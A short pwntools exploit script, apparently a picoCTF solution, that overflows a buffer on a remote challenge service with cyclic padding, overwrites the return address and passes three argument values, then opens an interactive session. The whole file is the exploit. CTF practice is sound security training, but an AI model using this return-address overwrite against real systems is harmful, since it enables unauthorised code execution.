from pwn import *

# io = process(b'./vuln')
io = remote('saturn.picoctf.net', 56543)

io.sendlineafter(b'Please enter your string: ', cyclic(112) + p32(0x8049296) + p32(0xDEADBEEF) + p32(0xCAFEF00D) + p32(0xF00DF00D))

io.interactive()